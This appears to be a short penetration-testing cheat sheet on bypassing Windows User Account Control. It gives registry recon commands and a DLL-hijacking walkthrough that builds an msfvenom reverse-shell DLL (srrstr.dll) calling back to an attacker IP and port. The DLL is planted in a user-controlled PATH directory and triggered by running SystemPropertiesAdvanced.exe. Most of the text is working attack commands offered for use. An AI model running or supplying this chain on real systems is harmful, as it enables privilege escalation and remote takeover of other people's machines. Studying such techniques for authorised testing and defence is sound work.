# UAC Bypass

### Recon

```shellscript
# Check if UAC is enabled => if we get 0x1, it is enabled
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Check UAC level
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
# Check Windows version
[environment]::OSVersion.Version
```

Then check the build version on UACME and see if an exploit is available

### Example

In our example, the OS is vulnerable to attack number 54 ⇒ dll hijacking

When attempting to locate a DLL, Windows will use the following search order.

1. The directory from which the application loaded.
2. The system directory `C:\Windows\System32` for 64-bit systems.
3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
4. The Windows directory.
5. Any directories that are listed in the PATH environment variable.

```shellscript
# Reviewing the PATH variable => look for a user controlled path
cmd /c echo %PATH%

# Generate a malicious srrstr.dll file
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

# Download the file to the target in the user controlled directory listed in PATH

# Execute the vulnerable function, which will use our malicious dll file 
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
